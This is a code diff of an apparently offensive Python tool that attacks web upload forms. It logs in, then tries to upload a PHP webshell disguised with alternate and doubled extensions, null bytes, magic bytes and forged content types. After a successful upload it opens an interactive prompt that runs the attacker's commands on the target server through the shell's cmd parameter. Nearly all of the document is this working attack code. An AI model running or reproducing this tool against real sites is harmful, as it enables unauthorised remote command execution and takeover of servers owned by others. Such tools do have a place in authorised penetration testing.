@@ -10,9 +10,36 @@ import sys
 import json
 import urllib
 from urllib.parse import urlparse
+import bs4 as bs
+from urllib import request
 
 
-def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location):
+def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
+         password):
+    sauce = urllib.request.urlopen(URL).read()
+    soup = bs.BeautifulSoup(sauce, "html.parser")
+    form = soup.find('form')
+    username_attr = form.find('input', type='text').get('name')
+
+    sauce = urllib.request.urlopen(URL).read()
+    soup = bs.BeautifulSoup(sauce, "html.parser")
+    form = soup.find('form')
+    password_attr = form.find('input', type='password').get('name')
+
+    payload = {
+        f'{username_attr}': f'{username}',
+        f'{password_attr}': f'{password}'
+    }
+
+    session = requests.Session()
+    session.post(URL, data=payload)
+
+    file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
+                   session)
+
+
+def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
+                   session):
     # Brute forcing different extensions
 
     try:
@@ -33,88 +60,92 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
 
         counter = 0
 
-        if EXTENSION == 'php':
+        print("[-] Trying different file extensions. Please be patient!")
 
-            print("[-] Trying different file extensions. Please be patient!")
+        response = session.get(URL, allow_redirects=False)
+        sauce = response.text
+        print(response.text)
+        soup = bs.BeautifulSoup(sauce, "html.parser")
+        form = soup.find('form')
+        print(form)
+        file_attr = form.find('input', type='file').get('name')
 
-            for ext in eval(EXTENSION):
+        for ext in eval(EXTENSION):
 
-                counter += 1
+            counter += 1
 
-                filename = f'shell.{EXTENSION}'
-                filename_ext = filename.replace("shell.php", f"shell{ext}")
-                files = {
-                    'image': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
-                    'submit': (None, 'Upload Image')
-                }
+            filename = f'shell.{EXTENSION}'
+            filename_ext = filename.replace("shell.php", f"shell{ext}")
+            files = {
+                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+            }
 
-                session = requests.Session()
-                response = session.post(URL, files=files, headers=headers, allow_redirects=False, proxies=proxies,
-                                        verify=TLS)
+            response = session.post(URL, files=files, headers=headers, allow_redirects=False, proxies=proxies,
+                                    verify=TLS)
 
-                print(f"[-] Trying differet {EXTENSION} extensions!")
-                print(f"[-] Try {counter} with: {filename_ext}")
-                # print(session.cookies.get_dict())
+            print(f"[-] Trying differet {EXTENSION} extensions!")
+            print(f"[-] Try {counter} with: {filename_ext}")
+
+            if verbosity:
+                print(response.text)
+
+            if SUCCESS in response.text:
+
+                if location != 'optional':
+
+                    print(f"[*] File uploaded successfully with: {filename_ext}")
+                    domain = urlparse(URL).netloc
+                    print(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+                    print("[*] Saved in results.txt")
+                    f = open("results.txt", "a")
+                    f.write(f"File uploaded successfully with: {filename_ext}\n")
+                    f.close()
+
+                else:
+                    print(f"[*] File uploaded successfully with: {filename_ext}")
+                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
+                    print("[*] Saved in results.txt")
+                    f = open("results.txt", "a")
+                    f.write(f"File uploaded successfully with: {filename_ext}\n")
+                    f.close()
+
+                if location != 'optional':
+
+                    while True:
+                        try:
+                            command = input("└─$ ")
+                            cmd_encoded = urllib.parse.quote(command)
+                            domain = urlparse(URL).netloc
+                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+
+                            response = session.get(final_url, headers=headers, allow_redirects=False,
+                                                   proxies=proxies, verify=TLS)
+                            print(f"URL is: {final_url}")
+                            print(response.text)
+
+                        except KeyboardInterrupt:
+                            print("KeyboardInterrupt execption is caught!")
+                            break
 
                 if verbosity:
                     print(response.text)
 
-                if SUCCESS in response.text:
+                if brute_force:
+                    break
 
-                    if location != 'optional':
-
-                        print(f"[*] File uploaded successfully with: {filename_ext}")
-                        domain = urlparse(URL).netloc
-                        print(f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
-                        print("[*] Saved in results.txt")
-                        f = open("results.txt", "a")
-                        f.write(f"File uploaded successfully with: {filename_ext}\n")
-                        f.close()
-
-                    else:
-                        print(f"[*] File uploaded successfully with: {filename_ext}")
-                        print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                        print("[*] Saved in results.txt")
-                        f = open("results.txt", "a")
-                        f.write(f"File uploaded successfully with: {filename_ext}\n")
-                        f.close()
-
-                    if location != 'optional':
-
-                        while True:
-                            try:
-                                command = input("[*] Enter a command to execute on the server: ")
-                                cmd_encoded = urllib.parse.quote(command)
-                                domain = urlparse(URL).netloc
-                                final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                                session = requests.Session()
-                                response = session.get(final_url, headers=headers, allow_redirects=False,
-                                                       proxies=proxies, verify=TLS)
-                                print(f"URL is: {final_url}")
-                                print(response.text)
-
-                            except KeyboardInterrupt:
-                                print("KeyboardInterrupt execption is caught!")
-                                break
-
-                    if verbosity:
-                        print(response.text)
-
-                    if brute_force:
-                        break
-
-                    else:
-                        sys.exit(1)
+                else:
+                    sys.exit(1)
 
     except requests.exceptions.RequestException as error:
         raise SystemExit(error)
 
     double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
-                     location)
+                     location, session, file_attr)
 
 
 def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
-                     location):
+                     location, session, file_attr):
     # Doubling the extension
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -138,11 +169,10 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
         filename = f'shell.{EXTENSION}'
         filename_ext = filename.replace(f"shell.{EXTENSION}", f"shell{ext}{ext}")
         files = {
-            'image': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+            f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
             'submit': (None, 'Upload Image')
         }
 
-        session = requests.Session()
         response = session.post(URL, files=files, headers={
             "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"},
                                 allow_redirects=False, proxies=proxies, verify=TLS)
@@ -172,16 +202,15 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                 f.write(f"File uploaded successfully with: {filename_ext}\n")
                 f.close()
 
-
             if location != 'optional':
 
                 while True:
                     try:
-                        command = input("[*] Enter a command to execute on the server: ")
+                        command = input("└─$ ")
                         cmd_encoded = urllib.parse.quote(command)
                         domain = urlparse(URL).netloc
                         final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                        session = requests.Session()
+
                         response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
                                                verify=TLS)
                         print(f"URL is: {final_url}")
@@ -200,10 +229,12 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
             else:
                 sys.exit(1)
 
-    null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location)
+    null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
+               session, file_attr)
 
 
-def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location):
+def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
+               session, file_attr):
     # Adds null bytes to the end of extensions
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -229,11 +260,10 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
             filename = 'shell.php'
             filename_ext = filename.replace("shell.php", f"shell{ext}{byte}")
             files = {
-                'image': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                 'submit': (None, 'Upload Image')
             }
 
-            session = requests.Session()
             response = session.post(URL, files=files, headers=headers,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
@@ -248,7 +278,8 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+                    print(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -266,11 +297,11 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
                     while True:
                         try:
-                            command = input("[*] Enter a command to execute on the server: ")
+                            command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                            session = requests.Session()
+
                             response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
@@ -297,15 +328,17 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
         for valid in valid_extensions:
             magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity,
-                        location)
+                        location, session, file_attr)
 
     else:
         valid = "".join(temp_extension)
 
-        magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location)
+        magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
+                    session, file_attr)
 
 
-def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location):
+def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
+                session, file_attr):
     # Uploading files with
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -336,11 +369,10 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
             print(f"[-] Try {counter} with: {filename_ext}")
 
             files = {
-                'image': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                 'submit': (None, 'Upload Image')
             }
 
-            session = requests.Session()
             response = session.post(URL, files=files, headers=headers,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
@@ -355,7 +387,8 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+                    print(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -373,11 +406,11 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
                     while True:
                         try:
-                            command = input("[*] Enter a command to execute on the server: ")
+                            command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                            session = requests.Session()
+
                             response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
@@ -405,11 +438,10 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
             print(f"[-] Try {counter} with: {filename_ext}")
 
             files = {
-                'image': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+                f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
                 'submit': (None, 'Upload Image')
             }
 
-            session = requests.Session()
             response = session.post(URL, files=files, headers=headers,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
@@ -422,7 +454,8 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     domain = urlparse(URL).netloc
-                    print(f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
+                    print(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}{filename_ext}?cmd=command")
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
@@ -440,11 +473,11 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
                     while True:
                         try:
-                            command = input("[*] Enter a command to execute on the server: ")
+                            command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-                            session = requests.Session()
+
                             response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
@@ -463,10 +496,12 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                 else:
                     sys.exit()
 
-    upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location)
+    upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
+                file_attr)
 
 
-def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location):
+def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
+                file_attr):
     print("[-] Trying different content-type headers. Please be patient!")
 
     with open("./content-type.txt", encoding='latin-1') as file:
@@ -478,11 +513,10 @@ def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_f
             print(f"[-] Try {counter} with Content-Type: {wordlist}")
 
             files = {
-                'image': (f'shell.{EXTENSION}', open(f'shell.{EXTENSION}', 'rb'), wordlist),
+                f'{file_attr}': (f'shell.{EXTENSION}', open(f'shell.{EXTENSION}', 'rb'), wordlist),
                 'submit': (None, 'Upload Image')
             }
 
-            session = requests.Session()
             response = session.post(URL, files=files, headers=headers,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
@@ -495,7 +529,8 @@ def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_f
 
                     print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
                     domain = urlparse(URL).netloc
-                    print(f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command")
+                    print(
+                        f"[*] You can access the uploaded file on: http://{domain}{location}shell.{EXTENSION}?cmd=command")
                     print("[*] Saved in results.txt")
                     f = open("results.txt", "a")
                     f.close()
@@ -507,16 +542,15 @@ def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_f
                     f.write(f"[*] File uploaded successfully with Content-Type: {wordlist}")
                     f.close()
 
-
                 if location != 'optional':
 
                     while True:
                         try:
-                            command = input("[*] Enter a command to execute on the server: ")
+                            command = input("└─$ ")
                             cmd_encoded = urllib.parse.quote(command)
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
-                            session = requests.Session()
+
                             response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
@@ -558,11 +592,19 @@ def main():
                       default="required_to_be_true")
 
     parser.add_option('-H', "--header", type="string", dest="header",
-                      help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single. Use comma to separate multi headers.',
+                      help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
                       default="optional")
 
     parser.add_option('-l', "--location", type="string", dest="location",
                       help='(Optional) - Supply a remote path where the webshell suppose to be. For exmaple: /uploads/',
+                      default="optional")
+
+    parser.add_option('-U', "--username", type="string", dest="username",
+                      help='(Optional) - Username for authentication. For exmaple: --username admin',
+                      default="optional")
+
+    parser.add_option('-P', "--password", type="string", dest="password",
+                      help='(Optional) - - Password for authentication. For exmaple: --username 12345',
                       default="optional")
 
     parser.add_option('-S', "--ssl", action="store_true", dest="ssl", help="(Optional) - No checks for TLS or SSL")
@@ -586,15 +628,19 @@ def main():
     proxy = options.proxy
     TLS = options.ssl
     brute_force = options.continue_brute
+    username = options.username
+    password = options.password
     verbosity = options.verbosity
     location = options.location
 
+    if username != 'optional' and password == 'optional':
+        print("Password is required!")
+
+    elif username == 'optional' and password != 'optional':
+        print("Username is required!")
+
     if TLS:
         TLS = False
-
-    # if you get this message:
-    # Could not find a suitable TLS CA certificate bundle, invalid path: True/False
-    # Change Variable TLS to TLS ="./cacert.pem"
 
     else:
         TLS = True
@@ -639,8 +685,15 @@ def main():
 
         else:
 
-            file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
-                           location)
+            if username != 'optional' and password != 'optional':
+
+                auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
+                     location, username, password)
+
+            else:
+                session = requests.Session()
+                file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
+                               location, session)
 
 
 if __name__ == "__main__":
